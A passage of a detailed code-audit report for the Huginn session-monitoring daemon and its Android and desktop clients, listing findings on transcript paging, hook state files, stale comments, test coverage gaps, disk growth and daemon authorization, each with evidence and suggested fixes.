startsAtBoundary checks only the byte BEFORE start (`fs.readSync(fd, b, 0, 1, start - 1); return b[0] === 0x0a`), but when file[start] itself is the '\n', text begins with '\n', split+filter already removes the empty fragment, and the first line is a WHOLE record — which line 254's `lines.slice(1)` then drops. Ran it with an aligned fixture (size 262315, start 171, byte AT start == '\n'): THE-BOUNDARY-RECORD absent from events, first event is the following record; control with the file one byte longer (start on the record's first byte): THE-BOUNDARY-RECORD present.
```

</details>

**Verifier's correction:** Severity MED -> LOW. The mechanism is exactly as described, but the finding's own probability estimate (~1 in avg-record-length) works out to ~1/6500 per cold open on this box's real transcripts (256KB window yields only 28-51 events => ~6.5KB mean record), and the one dropped record is the topmost row of a view that already displays 'Showing the most recent part of this session.' The failure_scenario's framing as 'the same user-visible loss the round-6 fix was bought to prevent' overstates it: the pre-fix behaviour dropped a record on every boundary-aligned cold open with no such rarity.

**Suggested fix:** Treat file[start] == 0x0a as a boundary too: before slicing, also check the first byte of the read buffer (`buf[0] === 0x0a` — no extra IO) and skip the slice when true.

### `server/appd/lib/transcript.js:406`

API-error assistant records carry model "<synthetic>" and `if (m.model) out.model = m.model` adopts it, so the session's model chip displays the literal string "<synthetic>" until the next real turn (or indefinitely if the session halted on the error).

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **verdict** CONFIRMED (CONFIRMED:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** A session hits a 529/rate-limit; Claude Code writes the error as a synthetic assistant record — often the LAST record, exactly when the owner opens the phone to see why the session stopped — and the model chip reads '<synthetic>' instead of 'Fable 5', persisting for the whole view session.

<details><summary>Evidence</summary>

```
Ran corpus scan: 85 records with `"model":"<synthetic>"` under ~/.claude/projects. Ran the module + formatModel: fixture with a real turn (claude-fable-5) followed by a synthetic record returns `model: "<synthetic>", modelDisplay: "<synthetic>"` (models.js formatModel passes unparseable ids through verbatim: `if (!p) return raw`). Both routes return `modelDisplay: formatModel(t.model)` (huginn-appd.js:2637, 3054) and both clients carry the non-null model forward across pages (TranscriptMerge.kt:68 `model = page.model ?: current.model`), so once seen it sticks.
```

</details>

**Verifier's correction:** Severity MED -> LOW, and the cited line is 405 not 406. The claim 'persisting for the whole view session' holds only when no further real assistant record arrives; any subsequent completed turn overwrites it (TranscriptMerge takes page.model when non-null). Also note the model CONTROL is unaffected — SessionScreen.kt:112 prefers the pane-scraped liveModel — so the wrong string appears in the app-bar subtitle only.

**Suggested fix:** In case 'assistant': `if (m.model && m.model !== '<synthetic>') out.model = m.model;` (transcript model is already defined as the last completed turn's model; an error record is not a completed turn).

### `server/appd/lib/transcript.js:521`

The sidechain/subagent path is dead against current Claude Code output: main transcripts contain zero isSidechain records (subagents write to subagents/agent-*.jsonl), so liveActivity().subagents is always 0 and the conversation view carries no subagent play-by-play despite the module header claiming it.

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner opens the conversation view while a workflow fans out 8 agents: activity.subagents reports 0, the strip's subagent suffix never renders from transcript data, and no subagent thinking/tool events appear inline — the 'thinking, tool calls, subagent output ... from structured data' promise in the module header (and the 2026-07-27 app design memory) is silently stale.

<details><summary>Evidence</summary>

```
Ran corpus scan: all 871 files containing `"isSidechain":true` are under subagents/ dirs; every main transcript back to the oldest retained (2026-07-18) has 0, including one with 33 Task/Agent tool_uses and 74 subagent files. liveActivity line 521 `if (e.sidechain) subagents++` therefore never increments; WorkSummary.kt:84's '· N subagents' headline suffix is unreachable from this field, and TranscriptGroups.kt:107 Row.Subagents grouping never fires. Partially compensated: bgAgents (ps-scan) and the /v1/sessions/<name>/agents route (agents.js) carry agent counts/status.
```

</details>

**Suggested fix:** Either drop the dead suffix and flag (and update the module header), or restore the feature deliberately: stitch agents' transcript tails into the session view via agents.js (which already reads them with readTranscript), marking those events sidechain:true so the existing grouping UI works again.

### `server/appd/test/desktop.test.js:89`

The test named 'the two channels are separate directories' proves only that resolveArtifact respects two directories the test itself creates; it never asserts the route-to-directory wiring in huginn-appd.js, which is where a cross-channel mistake would actually live.

**lane** test coverage map — find the next TermKeys · **contract** C3 · **verdict** not separately verified

**What goes wrong:** During a cutover edit, DESKTOP_DIR and DESKTOP_KT_DIR are transposed. The owner's running Electron 0.4.0 client polls /v1/desktop, is offered the Compose manifest, downloads Huginn-Desktop-Setup-x.y.z.exe and installs it from its own update prompt — the exact 'replaced by a different application, silently' outcome release-desktop.sh:13-17 exists to prevent. deploy.sh's node --check passes and all 385 tests pass.

<details><summary>Evidence</summary>

```
test/desktop.test.js:89-113 builds `root/desktop` and `root/desktop-kt` itself and asserts `resolveArtifact(electron, <compose file>).ok === false`. The mapping under audit lives in the untestable file: huginn-appd.js:72-73 `const DESKTOP_DIR = path.join(DATA_DIR, 'desktop'); const DESKTOP_KT_DIR = path.join(DATA_DIR, 'desktop-kt');` and :2840/:2853 `readManifest(DESKTOP_DIR)` / `readManifest(DESKTOP_KT_DIR)`. Swapping those two constants — one line — would serve the Compose installer from /v1/desktop to the owner's running Electron client, and desktop.test.js would report 7/7 pass, because it never loads huginn-appd.js (`grep -rl "huginn-appd" test/` -> NONE). I verified the wiring is currently correct by reading it, and that `/v1/desktop-kt/manifest` cannot be captured by the `/^\/v1\/desktop\/([^/]+)$/` branch at :2844.
```

</details>

**Suggested fix:** Assert the route, not the helper: once huginn-appd.js exports (see the huginn-appd.js finding) or via a spawned scratch daemon like test-integration/ already does, stock both DATA_DIR channels with distinguishable manifests and assert GET /v1/desktop/manifest returns the electron version and GET /v1/desktop-kt/manifest returns the compose one — and that each channel 404s the other's artifact name.

### `server/appd/test/watch.test.js:99`

No test pins createdAt through digest(), the one carried field whose loss would silently disable the born-in-window chat alert — the exact evaporation shape the snippet regression right above it was written for.

**lane** alerting / watch / FCM push / push tokens / notify claim · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Someone tidies lib/watch.js and drops the createdAt line (it is not in the hash, so it looks like dead weight). All 385 tests still pass. In production every chat digests with createdAt 0, so bornSincePrev is false for every chat, and the entire born-and-finished-inside-one-window class of alert — a one-line question answered in eight seconds, the case the feature was added for — stops firing with no error anywhere.

<details><summary>Evidence</summary>

```
test/watch.test.js:93-107 documents the trap ("this function rebuilds each chat from an explicit list and silently dropped anything not named") and covers snippet with two tests, but grep over the whole test dir shows createdAt only in alerts.test.js:306,318,327,338,348 — all of which call decideAlerts directly with a hand-built observation, bypassing digest() entirely. lib/watch.js:37 `createdAt: Number(x.createdAt) || 0` is therefore untested, while lib/alerts.js:192 `const createdMs = (Number(cur.createdAt) || 0) * 1000;` reads it and lib/alerts.js:193 turns a 0 into bornSincePrev=false.
```

</details>

**Suggested fix:** Add the mirror of the snippet tests: `test('a chat createdAt survives the digest')` asserting d.chats.c1.createdAt equals the input, plus one asserting a missing createdAt digests to 0 and not undefined. Better still, add a test that asserts the digest's chat keys are a superset of chatStates()'s field names so the two lists cannot silently diverge again.

### `server/bin/huginn-claude-title:88`

When the hook payload is empty or not JSON-parseable, the fallback overwrites a previously-good state file with a bare state word — destroying the sessionId/transcript mapping — and leaves a zero-byte .tmp orphan behind.

**lane** CLI client + server glue + provisioning (never audited) · **contract** C9 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** jq is temporarily unavailable (mid-`apt upgrade`, or a host provisioned before setup.sh's `apt-get install jq` completes) or one hook invocation arrives with no stdin. The next hook rewrites the state file as the bare word `running`; appd's readSessionState returns transcript:null, `hasTranscript` flips false, and the phone/desktop transcript view for that session goes blank until a later well-formed hook restores it. The stale .tmp is never cleaned except on SessionEnd.

<details><summary>Evidence</summary>

```
huginn-claude-title:86-95:
  if [ -n "$payload" ] && command -v jq >/dev/null 2>&1; then
    printf '%s' "$payload" | jq -c ... > "$STATE_DIR/$sess.tmp" 2>/dev/null \
      && mv -f "$STATE_DIR/$sess.tmp" "$STATE_DIR/$sess" 2>/dev/null \
      || printf '%s\n' "$st" > "$STATE_DIR/$sess" 2>/dev/null
  else
    printf '%s\n' "$st" > "$STATE_DIR/$sess" 2>/dev/null
  fi
The `>` truncates the .tmp before jq runs, and on jq failure the `||` writes the bare word over the GOOD file rather than leaving it untouched.
RAN (repro) in scratch tmux session audit_title:
  valid Stop payload   -> {"state":"idle","sessionId":"SID-123","transcript":"/tmp/t.jsonl","cwd":"/root","ts":...}, RC1=0
  `printf 'not json' | huginn-claude-title PreToolUse` -> file becomes `running`, RC2=0, and `audit_title.tmp` left at 0 bytes
  `printf '' | huginn-claude-title PreToolUse`         -> file becomes `running`, RC3=0
appd tolerates the bare word (huginn-appd.js:259 returns sessionId:null, transcript:null) so nothing errors — the transcript view just goes empty.
```

</details>

**Suggested fix:** Only overwrite the state file on jq success — write the fallback to the .tmp and move it, or skip the write entirely and `rm -f` the .tmp — so a bad payload degrades to 'no update' rather than to 'mapping destroyed'.

### `server/bin/huginn-claude-title:88`

The state filename is the raw tmux session name with no validation, while tmux permits `/` in session names — such a session silently gets no state file at all, and the clients can never render its transcript.

**lane** CLI client + server glue + provisioning (never audited) · **contract** C9 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A session is created directly with tmux rather than through `cc`/the CLI (routine — `tmux new -s foo/bar` from an attached shell, or a script). Every hook write silently fails; appd lists the session from tmux but readSessionState returns null, so it shows with no state icon and an empty transcript forever, and nothing anywhere logs why.

<details><summary>Evidence</summary>

```
huginn-claude-title:66 `sess="${info#*|}"` (straight from `tmux display-message '#{session_name}'`, unvalidated) and :88 `> "$STATE_DIR/$sess.tmp"`. Only `mkdir -p "$STATE_DIR"` is done — no parent dirs for a nested name — and every write is `2>/dev/null`, so the failure is invisible.
The validation that exists lives elsewhere and does not cover this path: cc:20 `^[A-Za-z0-9_]+$`, client/huginn.sh:16 the same, and huginn-appd.js:2620 a LOOSER `[A-Za-z0-9_][A-Za-z0-9_.-]{0,49}`.
RAN: `tmux new-session -d -s 'audit_sl/ash'` -> SLASH SESSION CREATED, listed by `tmux ls` as `audit_sl/ash` (killed immediately). A hook firing in that session would target /run/huginn-claude-state/audit_sl/ash, whose parent does not exist.
```

</details>

**Suggested fix:** Sanitise in the hook: `sess=${sess//[^A-Za-z0-9_]/_}` (or reject and exit 0) before building the path, and align appd's session-name regex with cc's `[A-Za-z0-9_]+`.

---

# INFO

### `desktop/src/main/settings.ts:55`

isAllowedBaseUrl accepts https:// URLs that AppdClient can never issue, so saving one bricks every request until the user retypes the address.

**lane** Electron desktop client (/opt/huginn/desktop) — security + data-loss only · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The owner, tidying up, edits the Server field to https://100.97.198.90:8787 and tabs out. Settings shows "Saved". Every subsequent call — list, watch stream, screen poll, updater's token re-arm — throws ERR_INVALID_PROTOCOL synchronously inside AppdClient.request, so the app reports connection errors with a message that names a protocol rather than the setting, and stays dead until the owner works out to put http:// back.

<details><summary>Evidence</summary>

```
settings.ts:55 `if (u.protocol !== 'http:' && u.protocol !== 'https:') return false` — https passes. But client.ts is hand-rolled on node:http only (client.ts:8 `import http from 'node:http'`, used at :121 and :204); there is no https path. RAN: `node -e "http.request(new URL('https://100.97.198.90:8787/v1/ping'),{},()=>{})"` → THROWS: ERR_INVALID_PROTOCOL - Protocol "https:" not supported. Expected "http:". Verified the validator branch accepts it: `new URL('https://100.97.198.90:8787').protocol === 'https:'` → true.
```

</details>

**Suggested fix:** Drop 'https:' from the accepted protocols in isAllowedBaseUrl until AppdClient can actually speak TLS (all four allowed hosts are loopback/tailnet/VLAN, so plain http is the intended shape).

### `desktop/src/shared/core/liveInput.ts:58`

Electron's client-side NAMED_KEYS mirror is stale — it lacks 'IC', which the daemon now accepts (the very key added for Insert), its 'Mirrors huginn-appd's NAMED_KEYS' comment is false, and Insert remains dead on Electron (keymap has no Insert entry).

**lane** protocol contract drift — what clients SEND vs what appd ACCEPTS · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner presses Insert in the still-installed Electron client's live mode: nothing is sent (silent), while the same key works on the Compose desktop — a confusing but harmless parity hole in a bug-fix-only client, and a trap if the mirror comment is trusted during a future fix.

<details><summary>Evidence</summary>

```
liveInput.ts NAMED_KEYS: 'Enter','Escape','Tab','BTab','Space','BSpace','DC','Up','Down','Left','Right','Home','End','PPage','NPage' — no 'IC'; keymap.ts NAMED table (lines 18-31) has no Insert mapping, and toWire's `op.keys.filter(isAllowedKey)` would drop IC if it were ever produced. Server NAMED_KEYS (huginn-appd.js:627) includes 'IC'. RAN IT: POST {"keys":["IC"]} to live daemon → {"ok":true} — regression fix held server-side; Compose TermKeys.kt:117 sends it; Electron cannot.
```

</details>

**Suggested fix:** One-line additions ('IC' to NAMED_KEYS, Insert:'IC' to keymap) or a comment correction — bug-fix-only scope either way.

### `mobile:1`

Full phone-vs-desktop parity matrix: 8 real one-sided gaps (5 on desktop, 3 on phone) against the owner's function+style-parity goal; everything else is at parity or correctly platform-specific.

**lane** feature parity, phone vs desktop · **verdict** not separately verified

**What goes wrong:** n/a — inventory finding; the gaps that hurt are broken out individually below.

<details><summary>Evidence</summary>

```
| Capability | Phone (:app) | Desktop (:app-desktop) | Verdict |
|---|---|---|---|
| Chats/Sessions/Status/Settings surfaces | yes | yes | PARITY |
| Wide layout | fold two-pane + rail (MainActivity 726-1157) | splitter panes + nav rail (Shell.kt) | CORRECTLY-PLATFORM-SPECIFIC (form factor) |
| Command palette Ctrl+K / shortcuts / cheatsheet F1 | no | yes (Shortcuts.kt) | CORRECTLY-PLATFORM-SPECIFIC (keyboard idiom) |
| Tray, close-to-tray, status line, single-instance, huginn:// scheme | no | yes (Main.kt) | CORRECTLY-PLATFORM-SPECIFIC (window mgmt) |
| Notification deep-link into session/chat | yes (OpenTarget) | yes (Activation/NavTarget) | PARITY |
| Foreground suppression of on-screen target | yes (Foreground.chat/session) | yes (focusedTarget) | PARITY |
| New Ask/Act chat | yes (FAB dialog) | yes (buttons+shortcuts+palette) | PARITY |
| Open/rename/delete chat, confirms | yes | yes | PARITY |
| Stop running chat from LIST row | no (only inside chat) | yes (right-click) | CPS (pointer menu; in-chat Stop is parity) |
| Multi-select bulk delete/kill, copy id/name | no | yes | CORRECTLY-PLATFORM-SPECIFIC (pointer) |
| Transcript rendering (thinking/tools/subagents, shared :ui rows) | yes | yes | PARITY |
| Streaming partial + thinking pulse + follow latch + jump-to-newest | yes | yes | PARITY (shared Follow/tailRevision) |
| Suggestion chips (fill composer, Suggest.visible) | yes | yes | PARITY |
| Chat model/effort picker | yes | yes | PARITY |
| Reset chat model/effort to host default | NO (no CLEAR option) | yes ("Host default") | MISSING-ON-PHONE |
| Change chat mode ask<->act after creation | NO (disabled chip; stale comment claims impossible) | yes (daemon accepts mode on PATCH) | MISSING-ON-PHONE |
| Cancel running chat turn | yes | yes | PARITY |
| Attach: file picker | yes | yes | PARITY |
| Attach: camera + photo library | yes | n/a | CORRECTLY-PLATFORM-SPECIFIC (hardware) |
| Attach: drag-drop + clipboard paste | n/a | yes | CORRECTLY-PLATFORM-SPECIFIC (pointer/clipboard) |
| Share-in from other apps | yes (share sheet + destination picker) | drop/paste covers it | CORRECTLY-PLATFORM-SPECIFIC |
| Voice mode (hands-free TTS loop) + dictation | yes (Android speech stack) | no | CORRECTLY-PLATFORM-SPECIFIC (SpeechRecognizer/TTS are Android services; JVM equivalent = new engine dependency) |
| Sessions list (titles, previews, bg work, meta) | yes |
```

</details>

**Suggested fix:** Work the individual findings below; all needed client calls already exist in :core, so every fix is thin shell UI.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/Lists.kt:75`

All four owner known-rough items from 2026-07-31 ('no right-click menus, no tooltips, plainer empty states, phone-sized row padding') are now implemented in the desktop shell — confirmed and located, so they should come off the polish list.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified

**What goes wrong:** None — this is a verification result. Residual keyboard gaps are filed separately (rename dialogs, and the wheel-scroll latch which is the one large regression against desktop input).

<details><summary>Evidence</summary>

```
Right-click: common/Menus.kt (HuginnMenuLook + chatMenu/sessionMenu incl. multi-select verbs) wired via RowMenu in Lists.kt:125/218 and installed at the shell root (Shell.kt:166 WithHuginnMenus). Tooltips: common/Tips.kt (Tip + pure formatters sessionStateTip/chatStateTip/bgWorkTip/connectionTip/railCountTip) used on every dot/count/rail item/status-line mark. Empty states: common/States.kt LoadingBlock vs EmptyBlock split on per-list loaded flags (Shell.kt:100-104 sessionsLoaded is its own flag) + NothingOpen with keyboard routes. Density: common/Density.kt 2/4/8 scale + DeskType, applied in Lists.kt rows (~44dp pitch per the file header).
```

</details>

**Suggested fix:** No action beyond the separately-filed findings; update the polish tracking so these four are not re-reported.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/notify/SessionWatchWorker.kt:319`

Regression sweep of the 2026-07-28 fixes: all eleven named fixes are present and intact, the owner's lock-screen rule holds exactly as specified, and the :app unit suite passes with real counts.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** n/a — verification record for the coverage map.

<details><summary>Evidence</summary>

```
Ran `./gradlew :app:testDebugUnitTest` (unpiped, EXIT=0) and asserted from the JUnit XML: tests=49 skipped=0 failures=0 errors=0 across ApiContract/AppLock/BackFrom/DeliveryHealth/DestSaver/Foreground/HeartbeatInterval/PlannedAgents/ReattachPlan. Statically verified: sessions get numbered answer buttons only and never a RemoteInput (post() lines 319-332); the chat reply action carries setAuthenticationRequired(true) (line 364); per-session notification ids with 4711/4712 collision nudge; threadFor() shared by push and reply writers; heartbeat arms before work and re-arms in finally; FCM claims the session before reconciling; Foreground suppression is resume-gated; FLAG_SECURE is set at onCreate AND tracked live; fragment pinned 1.8.5; backFrom drives both the arrow and the system gesture.
```

</details>

**Suggested fix:** None needed.

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/data/HuginnClient.kt:87`

STREAM_READ_TIMEOUT_MS's contract comment says the daemon keepalives chat streams 'every 20s' but the daemon pings every 15s — the safe direction, yet the tier's stated rationale number is wrong.

**lane** :core — HuginnClient.kt, HTTP/SSE, reattach, timeouts, models · **verdict** not separately verified

**What goes wrong:** Someone retunes STREAM_READ_TIMEOUT_MS against the documented 20s cadence (e.g. down to 45s 'two missed pings + slack') believing they have 2.25 ping intervals of margin when the real contract is 15s — the number survives review because the comment corroborates it; no runtime failure today since 15s < 20s < 60s.

<details><summary>Evidence</summary>

```
Comment: 'The daemon now emits a keepalive comment every 20s, so silence for a minute means the path is genuinely gone.' Daemon: `setInterval(() => { for (const run_ of activeRuns.values()) ... res.write(': ping\n\n') }, 15_000)` (huginn-appd.js:3138-3145). Watch-side numbers were verified accurate (25s keepalive vs 60s WATCH tier, 30-min rotate; screen long-poll clamp 30s and watch long-poll clamp 300s vs 150s/180s POLL tier — no production Kotlin caller passes watch wait>0, all use waitMs=0).
```

</details>

**Suggested fix:** Correct the comment to 15s and point it at the daemon's setInterval so the two numbers are findable from each other (or state the invariant as 'keepalive interval must stay under a third of this tier').

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/data/HuginnClient.kt:630`

sse() completes silently when the body ends cleanly on a frame boundary without a done frame (typical daemon restart: last write is '\n\n'-terminated, FIN arrives), while watchStream's identical case emits Failure("stream ended") — an asymmetry both current collectors happen to compensate for.

**lane** :core — HuginnClient.kt, HTTP/SSE, reattach, timeouts, models · **verdict** not separately verified

**What goes wrong:** Any NEW ChatEvent collector written to key 'the link broke' off ChatEvent.Failure (the way WatchEvent consumers do) silently misses chat-stream drops of this shape: a daemon restart mid-run ends the flow with neither Done nor Failure, and that collector shows a frozen half-answer with no error and no reattach.

<details><summary>Evidence</summary>

```
sse(): `val line = lines.next() ?: break` then nothing after the while loop — no emission; watchStream (line 380) has `emit(WatchEvent.Failure("stream ended"))` after its loop for exactly this case. Compensation exists today: phone collect() unconditionally runs resumeIfStillRunning(id) after the flow ends (HuginnViewModel.kt:1470-1476), desktop consume() loops on reattachFlow (ChatController.kt:300-325), so no user-visible wedge — verified by reading both collectors.
```

</details>

**Suggested fix:** Mirror watchStream: after the read loop in sse(), if no done frame was seen, emit ChatEvent.Failure("stream ended") (or a dedicated Ended event) so completion-without-done is always represented in-band; today's collectors keep working since they already treat Failure as non-terminal.

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/data/Models.kt:575`

The AnswerResult refusal contract (409 body carrying reason gone/changed plus the refreshed prompt+fingerprint) is unreachable in the Kotlin clients: HuginnClient.call() throws on every non-2xx, so only the error string survives and the re-offer payload is a silently dropped feature.

**lane** protocol contract drift — what clients SEND vs what appd ACCEPTS · **verdict** not separately verified

**What goes wrong:** A notification answer races a pane change: the daemon's 409 carries the NEW question and fingerprint, but the phone only surfaces the error text and cannot re-offer the new choices without a fresh screen fetch; the documented reason field can never drive behavior.

<details><summary>Evidence</summary>

```
Models.kt doc: "A refusal is a 409 carrying `reason`: `gone` ... `changed` ..."; but HuginnClient.kt:213 `if (!resp.status.isSuccess()) throw errorFrom(resp.status.value, text)` runs before any AnswerResult decode. Server sends 409 bodies with {ok:false, reason, error, prompt, fingerprint} (huginn-appd.js:2748-2760). HuginnViewModel.answerPromptMulti's `else r.error ?: "Could not answer"` branch is dead code — a non-ok response never reaches it.
```

</details>

**Suggested fix:** In answerPrompt/answerPromptMulti, catch HuginnException with code 409 and decode the body into AnswerResult (or make call() return the body for expected-409 routes).

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/data/Platform.kt:19`

expect/actual census is CLEAN and under budget: exactly 2 expect declarations exist in the whole tree (huginnHttpEngine, huginnIoDispatcher); the glyph blit is NOT expect/actual but a CellPainter interface parameter — so the sanctioned 'glyph blit x2' slots are unused, and the doc's 'There are four in the whole project' (ADDING-A-FEATURE.md:49) overcounts.

**lane** KMP layering contract and shell-level duplication (C1) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** None — this is the census the lane was asked for, and it passes.

<details><summary>Evidence</summary>

```
Ran grep for expect/actual declarations across core/ui/app/app-desktop src: only Platform.kt:19 `expect fun huginnHttpEngine()`, :31 `expect val huginnIoDispatcher`, with actuals in Platform.android.kt:8,10 and Platform.jvm.kt:8,10. ui has zero expect/actual; TerminalCanvas.kt:29 declares `interface CellPainter`, implemented by AndroidCellPainter (ui/androidMain, imports android.graphics.Paint — the sanctioned android usage in :ui) and SkiaCellPainter (ui/jvmMain). No un-sanctioned expect/actual anywhere; platform differences elsewhere use LocalTranscriptMetrics/LocalMonoStyle parameters as required.
```

</details>

**Suggested fix:** Optionally correct ADDING-A-FEATURE.md:49 to 'two expect/actuals; the glyph blit is an interface' so the budget reads true.

### `mobile/dist/latest-debug.json:1`

Build output is accumulating fast on a filesystem that is 80% full: mobile/dist holds 29 debug APKs totalling 1.5 GB and the two appd update channels hold 933 MB, with only 12 GB free on /.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** At roughly 50 MB per debug build and several builds a day during an active parity push, mobile/dist grows ~1 GB/week unbounded. On a 12 GB margin that is about three months to a full root filesystem on the agent host — which would take down huginn-appd, the tmux sessions and Claude Code together, with no alert pointing at a build directory.

<details><summary>Evidence</summary>

```
`du -sh /opt/huginn/mobile/dist` -> 1.5G, `ls mobile/dist/*.apk | wc -l` -> 29. `du -sh /var/lib/huginn-appd/*` -> desktop 573M, desktop-kt 360M. `df -h /` -> `/dev/loop1 59G 45G 12G 80% /`.
The APKs are correctly gitignored (mobile/.gitignore:10 `dist/*.apk`) so this is not a git problem, and the channel dirs are correct — both release scripts use KEEP=2 (release-desktop.sh:36, desktop/scripts/release.sh:16) and each manifest points at the newest version, so the 0.3.0-alongside-0.4.0 and 0.3.0-alongside-0.3.1 pairs are intentional, not orphans. But nothing prunes mobile/dist at all.
```

</details>

**Suggested fix:** Add a keep-N prune to mobile/scripts/build.sh's export step (the same node one-liner release-desktop.sh:346-366 already uses), or a cron sweep of `mobile/dist/*.apk` older than a week. The tracked latest*.json manifests must be kept.

### `mobile/scripts/build.sh:92`

The PIPESTATUS handling around the appd test run is dead code: `set -euo pipefail` aborts on the pipeline itself, so NODE_RC is never read and its diagnostic never prints.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **contract** C11 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Not a correctness defect — the gate is still fail-closed. The observable effect is that a failing appd suite kills build.sh with no "[build] server tests failed" line and leaves an orphan mktemp file in /tmp, which is a worse debugging experience than the code intends and could mislead a future reader into thinking the exit came from somewhere else.

<details><summary>Evidence</summary>

```
Line 9 is `set -euo pipefail`. Line 91-95:
```
node --test "$APPD_DIR"/test/*.test.js | tee "$NODE_LOG"
NODE_RC="${PIPESTATUS[0]}"
...
[ "$NODE_RC" = 0 ] || { echo "[build] server tests failed" >&2; exit 1; }
```
With pipefail the pipeline's status is node's, and set -e exits on it immediately — line 92 is unreachable when node fails, and PIPESTATUS[0] is always 0 when it is reached. Also collateral: the `rm -f "$NODE_LOG"` on line 94 never runs on failure, so a temp file is left behind on exactly the run an operator wants to inspect.
VERIFIED the shell semantics by running an equivalent `set -euo pipefail` script with a failing left-hand side: the script exited 1 before the post-capture line.
```

</details>

**Suggested fix:** Either drop the dead NODE_RC lines and let pipefail speak, or make the intent real: `set +e; node --test ... | tee "$NODE_LOG"; NODE_RC=${PIPESTATUS[0]}; set -e` and keep the rm and the message on both paths.

### `server/appd/huginn-appd.js:12`

The file's stated security model says the daemon binds the tailscale address only, but production overrides it to 0.0.0.0 - so the one document a future reader of this file will trust understates the exposed surface.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A future session hardening this daemon reads the header, concludes 'tailnet is the trust boundary, so the bearer token is defence in depth', and declines to add per-IP logging or failed-auth alerting as unnecessary. In fact the listener answers on 192.168.2.117 to both server VLANs and to anything routed through the Yggdrasil LAN gateway, where the token is the ONLY boundary - which is precisely the situation that makes the missing source-IP logging matter.

<details><summary>Evidence</summary>

```
huginn-appd.js lines 12-15:
  // Security model: binds the TAILSCALE address only (devstore precedent: tailnet is
  // the trust boundary) AND requires `Authorization: Bearer <token>` on every route,
  // token in /etc/huginn-appd/token (created by deploy.sh, 0600). Everything this
  // daemon can do equals root-on-huginn — the token is not decorative.
and resolveBind() at 3148 honours HUGINN_APPD_BIND before consulting tailscale.
RAN: `systemctl show huginn-appd -p Environment` -> `NODE_ENV=production HOME=/root HUGINN_APPD_BIND=0.0.0.0`; the reason is documented only in /etc/systemd/system/huginn-appd.service.d/override.conf ('Yggdrasil phase 2 ... Access stays gated by the bearer token'). The repo's own huginn-appd.service is byte-identical to the installed unit and carries no hint of the override.
```

</details>

**Suggested fix:** Amend the header comment to state the real deployment: bind is HUGINN_APPD_BIND (0.0.0.0 in production since the Yggdrasil LAN gateway landed), so the bearer token - not the network - is the trust boundary, and point at the drop-in.

### `server/appd/huginn-appd.js:153`

The Authorization scheme match is case-sensitive, rejecting the RFC 6750-legal 'bearer'.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Every current in-house client hard-codes 'Bearer', so nothing is broken today. The cost is a future one: an HTTP library, proxy, or a hand-written curl in a runbook that normalises the scheme to lowercase gets a flat 401 with a message ('unauthorized') that points at the token rather than at the header casing, which is a slow thing to debug against a daemon whose token is the only failure mode anyone expects.

<details><summary>Evidence</summary>

```
Code (151-158):
  const h = req.headers['authorization'] || '';
  const m = /^Bearer\s+(.+)$/.exec(h);
  if (!m) return false;
RFC 6750 s2.1: the scheme name is case-insensitive.
RAN:
  -H 'authorization: bearer <tok>'  -> 401
  -H 'Authorization: Bearer <tok>'  -> 200
  -H 'Authorization: Bearer <tok> ' -> 200 (Node trims trailing OWS)
  -H 'Authorization: Bearer\t<tok>' -> 200
  -H 'Authorization: Bearer <tok>x' -> 401
  -H 'Authorization: Bearer <tok[0:10]>' -> 401
```

</details>

**Suggested fix:** Make the scheme case-insensitive: `/^Bearer\s+(.+)$/i`. The token comparison stays exact and timing-safe.

### `server/appd/huginn-appd.js:225`

The daemon's own input-validation primitives (NAME_RE/canonName, validKey, validModel, validEffort) and every HTTP route are entirely untested — all 18 test files target lib/ modules only, and none of these functions is even exported.

**lane** command and tmux injection in appd · **contract** C11 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Not a runtime defect. It is why the '.'-in-NAME_RE divergence, the fingerprint bypass and the send-keys ';' loss have all shipped and stayed: there is no test that can fail for them, so every future edit to canonName/validKey/the send path is unguarded too.

<details><summary>Evidence</summary>

```
`ls test/` -> accounts, agents, alerts, autoswitch, chatqueue, clients, desktop, fcm, models, pane, plan, pushtokens, suggest, tasks, transcript, uploads, usage, watch — one per lib/ module, none for huginn-appd.js.
```
$ grep -rn 'canonName\|NAME_RE\|validKey\|multiToggleDigits' test/
test/pane.test.js:260,569,571,573   (multiToggleDigits only — a lib/pane export)
```
RAN IT — the existing gate is green, so these findings are not pre-existing breakage: `node --test test/pane.test.js test/models.test.js test/tasks.test.js` -> EXIT=0, `# tests 91 / # pass 91 / # fail 0` (unpiped, real counts asserted). Four of the defects above (the two dotted-name findings, the /keys ordering bug, the trailing-';' loss) are pure-function-level and would each be caught by a three-line unit test if these helpers were exported and covered.
```

</details>

**Suggested fix:** Export canonName/validKey/NAME_RE (or lift them into a lib/names.js) and add test/names.test.js asserting canonName rejects '.', validKey's exact accept/reject set, and a tmux-escaping helper's handling of ';'. A route-level smoke test against a scratch daemon (HUGINN_APPD_PORT/HUGINN_APPD_TOKEN_FILE/HUGINN_APPD_DATA are all already env-overridable) would cover /keys and /answer.

